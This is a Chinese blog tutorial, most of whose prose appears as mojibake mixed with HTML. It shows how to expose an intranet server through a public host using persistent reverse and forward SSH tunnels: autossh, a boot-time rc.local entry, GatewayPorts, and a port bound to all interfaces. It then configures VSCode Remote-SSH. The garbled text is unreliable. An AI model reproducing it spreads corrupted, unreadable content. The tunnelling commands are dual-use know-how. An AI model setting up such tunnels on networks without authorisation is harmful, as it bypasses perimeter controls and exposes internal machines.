ssh</h2><p>ä¸å¦¨å‡è®¾å¦‚ä¸‹ï¼Œ<strong>è®°æ¸…æ¥šäº†å™¢ï¼Œåé¢é¢‘ç¹ç”¨åˆ°çš„</strong>ã€‚</p><table><thead><tr><th>computer</th><th>IP/address</th><th>info</th></tr></thead><tbody><tr><td>å†…ç½‘æœåŠ¡å™¨A</td><td>172.x.x.x</td><td>å¯ä»¥è®¿é—®å¤–ç½‘ï¼Œä½†å¤–ç½‘ä¸èƒ½ç›´æ¥è®¿é—®A</td></tr><tr><td>å…¬ç½‘æœåŠ¡å™¨B</td><td>test.com</td><td>å¯ä»¥è®¿é—®å¤–ç½‘ï¼Œä¹Ÿå¯è¢«å¤–ç½‘è®¿é—®</td></tr><tr><td>èƒ½å¤Ÿè”ç½‘çš„ä¸»æœºC</td><td>-</td><td>æƒ³è¦åœ¨Cä¸Šå¯¹Aè¿›è¡Œè®¿é—®</td></tr></tbody></table><h3 id="å†…ç½‘æœåŠ¡å™¨Aä¸Šçš„è®¾ç½®"><a href="#å†…ç½‘æœåŠ¡å™¨Aä¸Šçš„è®¾ç½®" class="headerlink" title="å†…ç½‘æœåŠ¡å™¨Aä¸Šçš„è®¾ç½®"></a>å†…ç½‘æœåŠ¡å™¨Aä¸Šçš„è®¾ç½®</h3><p>Aè®¾ç½®åå‘ä»£ç†åˆ°Bçš„ port1 ç«¯å£  </p><blockquote><p>å·¥ä½œåŸç†ï¼š<br>1ã€æœ¬åœ°ä¸»æœºå’Œè¿œç¨‹ä¸»æœºå»ºç«‹è¿æ¥ï¼›<br>2ã€è¿œç¨‹ä¸»æœºä¸Šåˆ†é…äº†ä¸€ä¸ª socket ä¾¦å¬ port ç«¯å£ï¼›<br>3ã€è¿œç¨‹ç«¯å£ä¸Šæœ‰äº†è¿æ¥, è¯¥è¿æ¥å°±ç»è¿‡å®‰å…¨é€šé“è½¬å‘æœ¬æœºçš„ç«¯å£ã€‚   </p><p>å¤‡æ³¨ï¼šroot ç™»å½•è¿œç¨‹ä¸»æœºæ‰èƒ½è½¬å‘ç‰¹æƒç«¯å£ã€‚</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -fCNR <span class="token operator">&lt;</span>port<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:localhost:22 usr_b@test.com -p <span class="token number">22</span></code></pre><blockquote><p>-R port1:host:port2 å°†è¿œç¨‹æœºå™¨çš„ç«¯å£æ˜ å°„åˆ°æœ¬åœ°ã€‚port1æ˜¯å…¬ç½‘æœåŠ¡å™¨Bçš„ç«¯å£ï¼Œhostä¸ºæœ¬åœ°Açš„IPï¼Œport2æ˜¯Aè¦æ˜ å°„åˆ°å…¬ç½‘çš„ç«¯å£ã€‚<br><code>usr_b@test.com</code> ç”¨æˆ·å@æœåŠ¡å™¨Båœ°å€ï¼Œè¡¨ç¤ºè¿æ¥åˆ°Bï¼Œä»¥ç”¨æˆ·<code>usr_b</code>ç™»å½•ã€‚å½“ç„¶<code>test.com</code>ä¹Ÿå¯ä»¥æ˜¯IPåœ°å€å•¦ã€‚<br>-f SSHå®¢æˆ·ç«¯åœ¨åå°è¿è¡Œ<br>-C å…è®¸å‹ç¼©<br>-g å…è®¸è¿œç¨‹ä¸»æœºå¯è¿œç¨‹è®¿é—®ï¼Œè¿™é‡Œæœ‰å‘ã€‚  ï¼ˆä½†<code>autossh</code>æ²¡æœ‰è¿™ä¸ªé€‰é¡¹æ‰€ä»¥åº”è¯¥å½±å“ä¸å¤§ï¼‰<br>-N Do not execute a shell or command. ä¸æ‰§è¡Œè„šæœ¬æˆ–å‘½ä»¤ï¼Œé€šå¸¸ä¸-fè¿ç”¨ã€‚<br>-p 22 è¡¨ç¤ºæŒ‡å®šè¿æ¥åˆ°Bçš„22ç«¯å£ï¼Œé»˜è®¤å°±æ˜¯22å•¦ï¼Œå¦‚æœä¸æ˜¯çš„è¯è®¾ç½®æˆBçš„sshç«¯å£ã€‚   </p></blockquote><p>æ³¨æ„ä¸€ä¸‹ï¼Œ<em>ï¼ˆç½‘ä¸Šè¯´ï¼‰</em>è¿™é‡Œæœ‰ä¸ªå‘ï¼Œ-gè¿˜éœ€è¦åœ¨å…¬ç½‘æœåŠ¡å™¨Båšä¸‹é¢çš„è®¾ç½®ï¼Œè®¾ç½®å®Œåå†é‡å¯æœåŠ¡ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash">ï¼ƒvim /etc/ssh/sshd_config æ–°å¢GatewayPorts <span class="token function">yes</span></code></pre><hr><h4 id="è¿›é˜¶1-autossh"><a href="#è¿›é˜¶1-autossh" class="headerlink" title="è¿›é˜¶1  autossh"></a><strong>è¿›é˜¶1  autossh</strong></h4><p>ç”±äºsshä¼šè‡ªåŠ¨æ–­å¼€è¿æ¥ï¼Œäºæ˜¯<strong>åˆ©ç”¨è‡ªåŠ¨é‡è¿å·¥å…·<code>autossh</code>ï¼Œä¿è¯è¿æ¥ç¨³å®š</strong>ã€‚</p><p>é¦–å…ˆå®‰è£…autosshï¼Œè¿™é‡Œæˆ‘ç”¨çš„æ˜¯CentOSç³»ç»Ÿã€‚å…¶ä»–ç±»ä¼¼çš„ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum -y <span class="token function">install</span> autossh</code></pre><blockquote><p>å…¶å®æˆ‘å‘ç°yumï¼ˆçš„æºé‡Œï¼‰æ‰¾ä¸åˆ°autosshï¼Œåæ¥æ˜¯ç”¨wgetä¸‹è½½ç„¶åæ‰‹åŠ¨å®‰è£…çš„â€¦</p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">screen</span> -S reverse_proxyautossh -M <span class="token operator">&lt;</span>port<span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span> -CNR <span class="token operator">&lt;</span>port<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>:localhost:22 usr_b@test.com</code></pre><p>å¤šäº†ä¸ª-Må‚æ•°ï¼Œè¡¨ç¤ºä»Bçš„port2æ£€æµ‹æ˜¯å¦æ–­çº¿ã€‚åŒæ—¶autosshä¼šåœ¨åå°è¿è¡Œï¼Œ-fä¹Ÿä¸éœ€è¦äº†ã€‚  </p><p>è¿™é‡Œçš„screenç”¨äºå‘½ä»¤è¡Œç»ˆç«¯åˆ‡æ¢ï¼Œç»™è¿™ä¸ªç•Œé¢èµ·äº†ä¸ªåå«<code>reverse_proxy</code>ï¼Œå½“ç„¶æ²¡æœ‰è£…screençš„è¯ä¹Ÿéœ€è¦è£…ä¸€ä¸‹ï¼Œä¸è¿‡ä¸æ‰§è¡Œscreenè¿™æ¡è¯­å¥ç†è®ºä¸Šä¹Ÿèƒ½ç”¨ã€‚</p><p><strong>æ³¨æ„ï¼Œport1å’Œport2å‡éœ€è¦åœ¨Bçš„å®‰å…¨ç»„å†…è®¾å¥½è§„åˆ™ï¼Œå…è®¸å¤–ç½‘è®¿é—®ã€‚</strong>  </p><p>è€Œåçœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰è¿è¡Œâ†“</p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220021730475.png" alt="çœ‹ä¸€ä¸‹è¿›ç¨‹"></p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220022409722.png" alt="netstatçœ‹ä¸€ä¸‹"></p><p>å¯è§Aå·²å’ŒBå»ºç«‹è¿æ¥ã€‚<br>æ­¤å¤„port1ä¸º9999ï¼Œport2ä¸º9998ï¼Œä»…ç”¨äºæ¼”ç¤ºï¼Œä½ å®Œå…¨å¯ä»¥çœ‹å¿ƒæƒ…é€‰æ‹©ä½ å–œæ¬¢çš„ç«¯å£ï¼Œå½“ç„¶æœ‰çš„ç«¯å£æœ‰ç‰¹å®šåŠŸèƒ½å¦å¤–è¯´ã€‚  </p><hr><h4 id="è¿›é˜¶2-å¼€æœºè‡ªå¯"><a href="#è¿›é˜¶2-å¼€æœºè‡ªå¯" class="headerlink" title="è¿›é˜¶2  å¼€æœºè‡ªå¯"></a><strong>è¿›é˜¶2  å¼€æœºè‡ªå¯</strong></h4><p>å½“ç„¶ï¼Œä¸ºäº†è¿æ¥å†å¯é ä¸€ç‚¹ï¼Œç¡®ä¿Aé‡å¯åè¿˜å¯ä»¥è¿ä¸Šï¼Œå¯ä»¥åœ¨Aä¸Šå†è®¾ç½®ä¸€ä¸‹<strong>å¼€æœºè‡ªåŠ¨å¯åŠ¨autossh</strong>ã€‚</p><p>æœ‰ä¸€ç§æ–¹æ³•æ˜¯åœ¨<code>/etc/rc.local</code>é‡Œé¢æ·»åŠ å¦‚ä¸‹å†…å®¹</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">su</span> - user_a -c <span class="token string">"autossh -i /home/user_a/.ssh/id_rsa -o BatchMode=yes -M &lt;port2&gt; -CNR &lt;port1&gt;:localhost:22 usr_b@test.com"</span></code></pre><p>å…¶ä¸­ï¼Œ<code>-i</code>åæ¥çš„æ˜¯SSH_KEY_FILE_PATHï¼Œå³ç§é’¥åœ°å€ï¼Œrootç”¨æˆ·é»˜è®¤ä¸º<code>/root/.ssh/id_rsa</code>ã€‚<br><code>user_a</code>æ˜¯Aä¸Šçš„ç”¨æˆ·ï¼Œä¸”è¦æ±‚åœ¨å…¬ç½‘æœåŠ¡å™¨Bä¸Šï¼Œå·²ç»æœ‰äº†Aä¸»æœºä¸Šç”¨æˆ·user_açš„å…¬é’¥<em>ï¼ˆè¿™ä¸ªåœ¨ä¸‹é¢Bçš„è®¾ç½®ä¸­ä»‹ç»ï¼‰</em>ã€‚</p><p>ç„¶åè®°å¾—ç»™è¿™ä¸ªæ–‡ä»¶èµ‹äºˆ<strong>å¯æ‰§è¡Œ</strong>æƒé™ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x /etc/rc.d/rc.local</code></pre><p>ä¸è¿‡çœ‹è¿™ä¸ªæ–‡ä»¶æ³¨é‡Šé‡Œçš„è¯´æ³•ï¼Œå¥½åƒè¿™ä¸ªæ–¹æ³•ä¸æ¨èäº†ã€‚  </p><p>å½“ç„¶<strong>è¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–çš„é…ç½®å¼€æœºè‡ªå¯çš„æ–¹æ³•</strong>ï¼Œæˆ‘ä¹ŸåˆšæŠ˜è…¾å¯¹Linuxä¹Ÿä¸ç†Ÿï¼Œåé¢å†çœ‹çœ‹å§ã€‚  </p><p>ç°åœ¨ä½ å¯ä»¥<code>reboot</code>è¯•ä¸€ä¸‹äº†ï¼Œå‰ææ˜¯ä½ èƒ½ç¡®ä¿ç”¨è¿™å°æœåŠ¡å™¨çš„å…¶ä»–äººæ²¡æ„è§ï¼Œé‡è¦æ•°æ®è®°å¾—ä¿å­˜å¥½å™¢ã€‚   </p><p>è¿™æ ·Aä¸Šçš„è®¾ç½®å°±å‘Šä¸€æ®µè½äº†ï¼Œä¸‹é¢çœ‹å…¬ç½‘æœåŠ¡å™¨Bã€‚  </p><hr><h3 id="å…¬ç½‘æœåŠ¡å™¨Bä¸Šçš„è®¾ç½®"><a href="#å…¬ç½‘æœåŠ¡å™¨Bä¸Šçš„è®¾ç½®" class="headerlink" title="å…¬ç½‘æœåŠ¡å™¨Bä¸Šçš„è®¾ç½®"></a>å…¬ç½‘æœåŠ¡å™¨Bä¸Šçš„è®¾ç½®</h3><p>å¦‚æœåªéœ€è¦åœ¨Bä¸Šå¯¹Aè¿›è¡Œè¿œç¨‹ç‚¼ä¸¹ï¼Œé‚£å°±ä¸éœ€è¦åœ¨Bä¸Šè®¾ç½®å•¥äº†ï¼Œç°åœ¨<strong>ç›´æ¥sshå°±å®Œäº‹äº†</strong>ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -p <span class="token operator">&lt;</span>port<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span> localhost</code></pre><p>å› ä¸ºå·²ç»æŠŠAçš„sshå¯¹åº”çš„22ç«¯å£æ˜ å°„åˆ°Bçš„port1ç«¯å£äº†å‘€ï¼  </p><p>è¯•ä¸€ä¸‹æœç„¶å¦‚æ­¤ã€‚  </p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220023008851.png" alt="åœ¨Bä¸Šsshè¿æ¥A"></p><h4 id="è¿›é˜¶-å…å¯†ç™»å½•"><a href="#è¿›é˜¶-å…å¯†ç™»å½•" class="headerlink" title="è¿›é˜¶  å…å¯†ç™»å½•"></a>è¿›é˜¶  å…å¯†ç™»å½•</h4><p>è¿™æ ·æ¯æ¬¡ç™»å½•éƒ½éœ€è¦è¾“å…¥å¯†ç ï¼Œæ˜¯æœ‰ç‚¹éº»çƒ¦äº†ã€‚</p><p>è¿™æœ‰ä¸ªåŠæ³•ï¼Œå°±æ˜¯æŠŠæœ¬æœºçš„sshå…¬é’¥å¤åˆ¶åˆ°è¦ç™»å½•çš„æœåŠ¡å™¨Açš„<code>~/.ssh/authorized_key</code>æ–‡ä»¶ä¸­ï¼Œå®ç°å…å¯†ç™»å½•ã€‚</p><p>ä»€ä¹ˆï¼Œä½ è¿˜è§‰å¾—å¤ªéº»çƒ¦äº†ï¼Ÿï¼Ÿï¼Ÿ</p><p>è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå¿«åŠæ³•ï¼Œå°±æ˜¯åœ¨Bä¸Šç™»å½•Aåæ‰§è¡Œè¿™ä¸ªâ€”â€”</p><pre class="language-bash" data-language="bash"><code class="language-bash">ssh-copy-id -i .ssh/id_rsa.pub  usr_a@172.x.x.x</code></pre><blockquote><p>-i æŒ‡å‘æœ¬åœ°çš„å…¬é’¥æ–‡ä»¶ï¼Œä¸€èˆ¬åœ¨ç”¨æˆ·çš„ç›®å½•ä¸‹ã€‚<br><code>usr_a</code> ä¸ºAä¸Šè¦ç™»å½•çš„ç”¨æˆ·å</p></blockquote><p>ç„¶åå°±å¯ä»¥ä»Bå…å¯†ç™»å½•å†…ç½‘æœåŠ¡å™¨Aå•¦ã€‚ä½ ç°åœ¨å¯ä»¥åœ¨Bä¸Šsshè¯•ä¸€ä¸‹ï¼Œç†è®ºä¸Šç›´æ¥å°±å·²ç»ç™»å½•å¥½äº†å‘¢ï¼  </p><hr><h3 id="åœ¨ä»»æ„ä¸€å°è”ç½‘ä¸»æœºCå¯¹Aè¿›è¡Œè®¿é—®çš„å®ç°"><a href="#åœ¨ä»»æ„ä¸€å°è”ç½‘ä¸»æœºCå¯¹Aè¿›è¡Œè®¿é—®çš„å®ç°" class="headerlink" title="åœ¨ä»»æ„ä¸€å°è”ç½‘ä¸»æœºCå¯¹Aè¿›è¡Œè®¿é—®çš„å®ç°"></a>åœ¨ä»»æ„ä¸€å°è”ç½‘ä¸»æœºCå¯¹Aè¿›è¡Œè®¿é—®çš„å®ç°</h3><p>åˆ°è¿™é‡Œæˆ‘æœ‰ç‚¹æˆå°±æ„Ÿäº†ï¼Œ<strong>è¿œç¨‹ç‚¼ä¸¹å®é™…ä¸Šå·²ç»å®ç°äº†</strong>ã€‚  </p><p>ç„¶è€Œæˆ‘çš„åˆè¡·æ˜¯è¦<strong>åœ¨ä¸€å°èƒ½è”ç½‘çš„ä¸»æœºCä¸Šå»è¿æ¥å†…ç½‘A</strong>çš„å‘€ï¼Œä¸è¡Œè¿˜å¾—å†æŠ˜è…¾ä¸€ä¸‹å•Šå‘œã€‚  </p><p>é¦–å…ˆè¯•äº†ä¸€ä¸‹ç›´æ¥è¿æ¥å…¬ç½‘æœåŠ¡å™¨Bçš„port1ï¼Œç„¶è€Œä¸å¯è¡Œã€‚  </p><p>ä¸è¿‡ç½‘ä¸Šæœ‰äº›èµ„æ–™è¯´æ˜¯å¯è¡Œçš„ï¼Œè¿™ä¸ªæˆ‘ä¹Ÿä¸çŸ¥é“å‘¢ï¼Œå¯èƒ½è¦é—®ç¥å¥‡çš„æµ·èºå§ã€‚   </p><blockquote><p>æ ¹æ®ç½‘ä¸Šçš„è¯´æ³•ï¼Œå·²ç»åœ¨Bä¸Šå¯¹<code>GatewayPorts</code>è¿›è¡Œäº†è®¾ç½®ï¼Œä¹Ÿæ€æ­»è¿›ç¨‹é‡å¯äº†æœåŠ¡ç”šè‡³ç›´æ¥<code>reboot</code>äº†ï¼Œç„¶è€Œä¸çŸ¥é“ä¸ºå•¥ä¸å¯è¡Œâ€¦â€¦</p></blockquote><p>ä¸è¿‡ä¹Ÿä¸æ˜¯æ²¡æœ‰åŠæ³•å‘¢ï¼Œsshé‡Œè¿˜æœ‰ä¸ª<strong>æ­£å‘ä»£ç†</strong>é—²ç€æ²¡äº‹å¹²å‘¢ï¼Œè¯´ä¸Šå°±ä¸Šå§ã€‚  </p><p>åœ¨Bä¸Šç»§ç»­è¿›è¡Œå¦‚ä¸‹é…ç½®</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -fCNL  *:<span class="token operator">&lt;</span>port<span class="token operator"><span class="token file-descriptor important">3</span>&gt;</span>:localhost:<span class="token operator">&lt;</span>port<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span> localhost</code></pre><p>è¡¨ç¤ºå°†Bä¸Šçš„port1æ˜ å°„åˆ°port3ï¼Œæ³¨æ„<strong>port3ä¹Ÿè¦è®¾ç½®å®‰å…¨ç»„è§„åˆ™</strong>å•Šã€‚  </p><p>ç”¨<code>ss -ant</code> çœ‹äº†ä¸€ä¸‹ï¼Œport3çš„ç¡®æ‰“å¼€äº†ã€‚  </p><p>ç†è®ºä¸Šè¿™æ ·çš„è¯åœ¨Cä¸Šsshè¿æ¥Bçš„port3ç«¯å£ï¼Œå°±å¯ä»¥ç›´æ¥è®¿é—®åˆ°å†…ç½‘Aäº†çš„ã€‚</p><p>å¦‚æœä½ æˆåŠŸäº†ï¼Œé‚£å°±å¯ä»¥<strong>ç›´æ¥è·³åˆ°é…ç½®VSCodeçš„éƒ¨åˆ†</strong>äº†ï¼Œ<strong>å°½æƒ…äº«å—è¿œç¨‹ç‚¼ä¸¹çš„å¿«æ„Ÿå§ï¼</strong>  </p><p><strong>å–œæ¬¢çš„è¯å¯ä»¥æ»‘åˆ°é¡µé¢ä¸‹æ–¹ï¼Œèµèµä¸€ä¸‹ç»™æˆ‘ä¹°ç‚¹å¥½åƒçš„<em>ï¼ˆæˆ‘é¥¿äº†.jpg</em></strong>    </p><hr><p><strong>ç„¶è€Œæˆ‘å¹¶æ²¡æœ‰æˆåŠŸâ€¦â€¦</strong>  </p><p>çœ‹äº†ä¸€ä¸‹å®‰å…¨ç»„è®¾ç½®ï¼Œæ²¡é—®é¢˜ï¼Œå”‰ï¼Œå¤§ä¸äº†å…¨å¼€äº†å˜›ã€‚è¿˜æ˜¯ä¸è¡Œã€‚  </p><p>è¿™é‡Œæˆ‘éš¾å—æ­»äº†ï¼Œæ€æ­»è¿›ç¨‹åˆé‡æ¥è¯•äº†å¥½å‡ æ¬¡ï¼Œä¸€æ ·æ²¡æœ‰æ•ˆæœã€‚  </p><p>å†å»ç½‘ä¸ŠæŸ¥äº†æŸ¥ï¼Œç›´åˆ°çœ‹åˆ°ä¸€ç¯‡æ–‡ç« é‡Œæåˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œä½†ä»–ç›´æ¥ç”¨çš„sshè€Œæ²¡æœ‰ç”¨åˆ°autosshï¼Œç”¨ä»–çš„æ–¹æ¡ˆè¿˜æ˜¯æ²¡è§£å†³é—®é¢˜ã€‚ä¸è¿‡é‡Œé¢æåˆ°äº†ä¸€ä¸ªå‘½ä»¤å«<code>lsof</code>ï¼Œå³â€œåˆ—å‡ºæ‰“å¼€æ–‡ä»¶(lists openfiles)â€ï¼Œè€Œåœ¨Unixä¸­ä¸€åˆ‡ï¼ˆåŒ…æ‹¬ç½‘ç»œå¥—æ¥å£ï¼‰éƒ½æ˜¯æ–‡ä»¶ã€‚<strong>è¿™å¯æ˜¯ä¸ªç¥å™¨å•Šï¼</strong>  </p><p>è¿™é‡Œç”¨åˆ°çš„æ˜¯     </p><blockquote><p>ä½¿ç”¨<code>-i :port</code>æ¥æ˜¾ç¤ºä¸æŒ‡å®šç«¯å£ç›¸å…³çš„ç½‘ç»œä¿¡æ¯ã€‚  </p></blockquote><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">lsof</span> -i :<span class="token operator">&lt;</span>port<span class="token operator"><span class="token file-descriptor important">3</span>&gt;</span>  <span class="token comment"># æŸ¥çœ‹è¿æ¥port3ç«¯å£çš„ç½‘ç»œä¿¡æ¯</span></code></pre><p>ç»“æœç±»ä¼¼äºè¿™æ ·ï¼ˆå¿˜è®°æˆªå›¾äº†ï¼‰ï¼Œæ­¤å¤„port3ä¸ºä»…ä¾›æ¼”ç¤ºæ‰€ç”¨çš„9988ã€‚</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># lsof -i :9988</span>COMMAND PID <span class="token environment constant">USER</span>   FD   TYPE  DEVICE SIZE/OFF NODE NAME<span class="token function">ssh</span>     <span class="token number">658</span> root    4u  IPv6  <span class="token number">146251</span>      0t0  TCP *:9988 <span class="token punctuation">(</span>LISTEN<span class="token punctuation">)</span></code></pre><p>è¿™é‡Œæˆ‘æ‰å‘ç°ï¼Œå™«ï¼Œæ€ä¹ˆåªç›‘å¬äº†IPv6ï¼Œè€Œæ²¡æœ‰IPv4å•Šï¼</p><p>å®é™…ä¸Šé€šè¿‡<code>ss -ant</code>ä¹Ÿå¯ä»¥å‘ç°å¯¹åº”çš„ç«¯å£åªæœ‰tcp6è€Œæ²¡æœ‰tcpâ€¦  </p><p>ç„¶è€Œé˜¿é‡Œäº‘å®ä¾‹ï¼ˆå®‰å…¨ç»„å†…ï¼‰åªæœ‰IPv4å‡ºå£æ¥ç€ï¼Œè€Œä¸”ä¹Ÿæ˜¯é€šè¿‡IPv4è¿æ¥åˆ°Bçš„ï¼Œæ€ªä¸å¾—è¿ä¸ä¸Šå‘¢ã€‚ï¼ˆä½›äº†  </p><p>ä¸è¿‡ä¹Ÿå¥‡æ€ªäº†ï¼Œç†è®ºä¸Šsshåº”è¯¥v4å’Œv6éƒ½ç›‘å¬çš„å§ã€‚  </p><p>å»æŸ¥äº†ä¸€ä¸‹sshå‘½ä»¤ï¼Œè¿™æ¬¡<strong>å¼ºåˆ¶ä½¿ç”¨ IPv4</strong>è¯•è¯•ã€‚  </p><p>ï¼ˆåœ¨Bä¸Šæ€æ­»ä¹‹å‰çš„sshï¼Œå†æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ã€‚è®°å¾—æ”¹æˆä½ çš„ç«¯å£å“ˆã€‚  </p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -fCNL  *:<span class="token operator">&lt;</span>port<span class="token operator"><span class="token file-descriptor important">3</span>&gt;</span>:localhost:<span class="token operator">&lt;</span>port<span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span> localhost -4</code></pre><blockquote><p><code>-4</code>è¡¨ç¤ºå¼ºåˆ¶ä½¿ç”¨IPv4</p></blockquote><p>è¿™å›å†çœ‹<code>lsof -i :&lt;port3&gt;</code>ï¼š  </p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># lsof -i :9988</span>COMMAND PID <span class="token environment constant">USER</span>   FD   TYPE  DEVICE SIZE/OFF NODE NAME<span class="token function">ssh</span>     <span class="token number">954</span> root    4u  IPv4  <span class="token number">255331</span>      0t0  TCP *:9988 <span class="token punctuation">(</span>LISTEN<span class="token punctuation">)</span></code></pre><p>ç„¶åå†åœ¨Cä¸Šè¿æ¥Bçš„port3ç«¯å£ã€‚</p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220021132045.png" alt="é€šè¿‡å¤–ç½‘æˆåŠŸè¿ä¸Šå†…ç½‘æœåŠ¡å™¨"></p><p>å“‡å“‡å“‡æˆåŠŸäº†ï¼  </p><p>çœ‹æ¥æœç„¶æ˜¯è¿™ä¸ªé—®é¢˜å•Šæˆ‘å“­äº†åˆç¬‘äº†ã€‚  </p><p>ä¸‹é¢å°±å¯ä»¥è®¾ç½®VSCodeæ¥å®ç°è¿œç¨‹ç‚¼ä¸¹å•¦ï¼  </p><h2 id="Guidance-for-VSCode"><a href="#Guidance-for-VSCode" class="headerlink" title="Guidance for VSCode"></a>Guidance for VSCode</h2><p>å…·ä½“å¯ä»¥å‚è€ƒ<em>Reference #1</em>ï¼Œè¿™é‡Œç®€å•æ“ä½œä¸€ä¸‹ã€‚  </p><p>åœ¨VSCodeå®‰è£…**<code>Remote Development</code>å¼€å‘åŒ…ï¼ˆæ‰©å±•ï¼‰**ï¼Œç„¶ååœ¨è¿œç¨‹èµ„æºç®¡ç†å™¨é‡Œæ–°å¢ä¸€ä¸ªSSH Targetã€‚  </p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220011642994.png" alt="VSCode_sshé…ç½®"></p><p>åœ¨ç”¨æˆ·çš„<code>.ssh/config</code>æ–‡ä»¶å†…æ–°å¢ä½ çš„å†…ç½‘ç‚¼ä¸¹ç‚‰ä¿¡æ¯ã€‚</p><blockquote><p>Host ç»™ä½ çš„å†…ç½‘ä¸»æœºèµ·ä¸ªåï¼ˆçœ‹ä½ å¿ƒæƒ…éšæ„å–ï¼‰<br>HostName  å…¬ç½‘æœåŠ¡å™¨Bçš„IPæˆ–åŸŸå<br>Port å¡«port3ï¼Œå¦‚æœport1èƒ½è¿ä¸Šå°±å¡«port1<br>User å¡«å†…ç½‘æœåŠ¡å™¨Açš„ç™»å½•ç”¨æˆ·å    </p></blockquote><p>ä¿å­˜ï¼Œç„¶åä¾¿å¯ä»¥è¿æ¥è¯•ä¸€è¯•äº†ã€‚  </p><p>è¿æ¥åè¾“å…¥Aå¯¹åº”ç”¨æˆ·çš„å¯†ç ï¼Œç„¶åå°±è¿ä¸Šäº†ã€‚æ‰“å¼€æ–‡ä»¶å¤¹è¿˜éœ€è¦å†è¾“ä¸€æ¬¡å¯†ç ã€‚   </p><p>ç°åœ¨å†ç”¨å‰é¢åœ¨Bçš„é…ç½®é‡Œè¯´çš„åŠæ³•ï¼ŒæŠŠCä¸»æœºçš„å…¬é’¥æ”¾åˆ°Aé‡Œå°±å¯ä»¥å®ç°å…å¯†ç™»å½•å•¦ï¼   </p><p>å‘ï¼Œè¿™å°±æ˜¯åœ¨Cä¸Šè¿æ¥åˆ°å†…ç½‘ç‚¼ä¸¹ç‚‰çš„æ•ˆæœäº†â†“ã€‚</p><p><img src="/2019/12/21/Idea_RemoteProgramming/image-20191220011440883.png" alt="VSCodeè¿œç¨‹ç‚¼ä¸¹æ•ˆæœ"></p><p>ç½‘ç»œå»¶æ—¶å‡ ä¹æ²¡æœ‰<em>ï¼ˆä¸è¿‡ä¹Ÿå–å†³äºç½‘ç»œç¯å¢ƒï¼‰</em>ï¼Œå’Œåœ¨æœ¬åœ°ç¼–ç¨‹å‡ ä¹æ²¡æœ‰å·®åˆ«ï¼Œçˆ½åˆ°çˆ†ç‚¸ï¼  </p><p>å“‡å“‡å“‡æˆå°±æ„Ÿçˆ†æ£šå•Šå“‡å“‡å“‡ï¼ï¼ï¼</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>æ—¶é—´å› ç´ ï¼Œä¸å¯é¿å…å¯èƒ½å­˜åœ¨ä¸€äº›å¤±è¯¯ä¹‹å¤„ï¼Œå…¶ä¸­ä¹Ÿæœ‰ä¸å°‘å¯ä»¥æ‹“å±•ä¹‹å¤„ï¼Œæ¬¢è¿äº¤æµæå‡ºå“ˆã€‚  </p><p>æœ¬æ–‡<strong>ä»…ç”¨äºå­¦ä¹ ç ”ç©¶ï¼Œè¯·åœ¨åˆç†åˆæ³•èŒƒå›´å†…ä½¿ç”¨</strong>ï¼Œ</p><p><strong>æœªç»å…è®¸ä¸å¾—å•†ç”¨ï¼Œè½¬è½½è¯·ç½²åMiaoTonyå¹¶ä¿ç•™æœ¬æ–‡é“¾æ¥</strong>ï¼Œè°¢è°¢ã€‚</p><p>è¯´ç‚¹é¢˜å¤–è¯å§ã€‚  </p><blockquote><p>ä¸Šå‘¨æœ«åˆ°è¿™å‘¨éƒ¨ç½²<a href="https://github.com/miaotony/NUAA_iCal_Web"><code>NUAA_iCal_Web</code>åœ¨çº¿ç‰ˆæœ¬</a>å¼„äº†ä¸€å‘¨æœ«ï¼ˆå¥½èœå•Šç¬¬ä¸€æ¬¡å¼„éƒ¨ç½²æ¥ç€â€¦ï¼‰ï¼Œé…æœåŠ¡å™¨ç¯å¢ƒæŠ˜è…¾äº†è€åŠå¤©ï¼ˆç”šè‡³åªè£…å¥½äº†GPUé©±åŠ¨å’Œanacondaè¿˜æ²¡é…CUDAï¼‰ï¼Œé…è¿œç¨‹ç‚¼ä¸¹åˆçæŠ˜è…¾äº†ä¸€ä¸¤å¤©ï¼Œå†™è¿™ç¯‡æ–‡ç« åˆæ–­æ–­ç»­ç»­åœ°èŠ±äº†å¥½å‡ ä¸ªå°æ—¶ã€‚  </p></blockquote><p>å‘œä¸‹å‘¨å¼€å§‹é¢‘ç¹è€ƒè¯•äº†ï¼Œä¸æ•¢çæŠ˜è…¾äº†å˜¤å˜¤å˜¤ã€‚ï¼ˆæºœäº†æºœäº†   </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://zhuanlan.zhihu.com/p/89662757">ä½¿ç”¨vscodeè¿›è¡Œè¿œç¨‹ç‚¼ä¸¹</a> </li><li><a href="https://www.cnblogs.com/zhongbin/p/3940956.html">SSHåå‘è¿æ¥ä½¿ç”¨Autosshè‡ªåŠ¨ssh</a>  </li><li><a 